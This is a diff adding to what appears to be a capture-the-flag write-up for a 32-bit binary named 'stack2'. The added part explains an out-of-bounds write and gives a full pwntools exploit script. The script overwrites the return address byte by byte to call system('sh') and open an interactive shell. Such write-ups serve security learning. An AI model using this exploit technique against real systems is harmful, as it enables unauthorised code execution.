@@ -197,10 +197,108 @@ I couldn't find any way to write `/bin/sh` to memory then call `system(memory)`
 
 Later I figured instead of it doing `system('/bin/sh')` why not it do `system('sh')` basically not using full path?
 
-Because the address of `/bin/bash` is stored on the binary if we just add like `address+0x7` it would give `sh`
+Because the address of `/bin/bash` is stored on the binary if we just do like `address+0x7` it would give `sh`
 ![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/892acae6-0828-4ec0-b784-2f42c874d6e7)
 
-But now we need to form the write payload to call `system('sh')` we can easily achieve that because we can control the `eip` 
+But now we need to form the write payload to call `system('sh')` we can easily achieve that because we can control the `eip`
+
+And on x86 arch argument are passed to function via the stack
+
+Here's the final exploit code
+
+```python
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+from pwn import *
+import tqdm
+from warnings import filterwarnings
+
+# Set up pwntools for the correct architecture
+exe = context.binary = ELF(args.EXE or 'stack2')
+
+filterwarnings("ignore")
+context.log_level = 'info'
+
+def start(argv=[], *a, **kw):
+    if args.GDB:
+        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
+    elif args.REMOTE: 
+        return remote(sys.argv[1], sys.argv[2], *a, **kw)
+    else:
+        return process([exe.path] + argv, *a, **kw)
+
+gdbscript = '''
+init-pwndbg
+break *main+802
+continue
+'''.format(**locals())
+
+#===========================================================
+#                    EXPLOIT GOES HERE
+#===========================================================
+
+def init():
+    global io
+
+    io = start()
+
+def write(idx, addr):
+    io.sendline(b'3')
+    io.sendlineafter(b'change:', str(idx))
+    io.sendlineafter(b'number:', str(addr))
+    sleep(1)
+
+def oob():
+    io.recvuntil('have:')
+    io.sendline('1')
+    io.recvuntil('numbers')
+    io.sendline('1')
+    
+    system = [0x08, 0x04, 0x84, 0x56][::-1]
+    sh = [0x08, 0x04, 0x89,0x87][::-1]
+    idx = 0x84
+
+    info("Sending payload")
+
+    for addr in system:
+        write(idx, addr)
+        idx += 0x1
+    
+    info("Chain one completed. EIP overwritten to: %#x", exe.plt['system'])
+    sleep(2)
+
+    for _ in range(4):
+        write(idx, 0x0)
+        idx += 0x1
+
+    info("Chain two completed. EIP overwritten to: %#x", 0x0)
+    sleep(2)
+
+    for addr in sh:
+        write(idx, addr)
+        idx += 0x1
+
+    info("Chain three completed. EIP overwritten to: %#x", 0x8048987)
+    info("Final Chain: eip -> system@plt -> 0x0 -> sh")
+    info("Spawning Shell ^^")
+    sleep(2)
+
+    io.sendline('5')
+
+    io.interactive()
+
+def main():
+    
+    init()
+    oob()
+
+
+if __name__ == '__main__':
+    main()
+```
+
+Running it works remotely
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/610a45f3-907b-44c9-8d23-edaf803ecc80)
 
 
 
